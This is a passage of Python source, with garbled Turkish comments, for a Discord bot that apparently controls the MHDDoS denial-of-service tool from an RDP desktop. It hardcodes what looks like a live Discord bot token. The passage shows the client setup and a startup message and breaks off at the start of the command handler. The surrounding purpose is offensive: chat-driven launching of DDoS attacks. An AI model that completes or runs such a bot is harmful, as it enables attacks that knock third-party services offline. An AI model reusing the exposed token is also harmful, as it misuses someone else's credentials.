          BOT_TOKEN = "MTQzMDYyNzc2OTMxNzk4NjM4NQ.G_VIV5.otgPTwQ92MRF-gzXUhVtcT4WOLCwggjAeD0nuk"
          
          # MHDDoS dizini
          MHDDOS_PATH = "C:\\Users\\RDP\\Desktop\\MHDDoS"
          
          # Discord client'Ä± ayarla
          intents = discord.Intents.default()
          intents.message_content = True
          client = discord.Client(intents=intents)
          
          # Aktif sÃ¼reÃ§leri takip etmek iÃ§in
          active_processes = []
          
          @client.event
          async def on_ready():
              print(f'Bot giriÅŸ yaptÄ±: {client.user}')
              print('------')
              # Botun Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± belirten bir mesaj gÃ¶nder
              for guild in client.guilds:
                  for channel in guild.text_channels:
                      if channel.name == "general":
                          await channel.send(f"âœ… Bot aktif! {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                          break
          
          @client.event
          async def on_message(message):
              # Botun kendi mesajlarÄ±nÄ± yok say
              if message.author == client.user:
                  return
          
              # Komut kontrolÃ¼
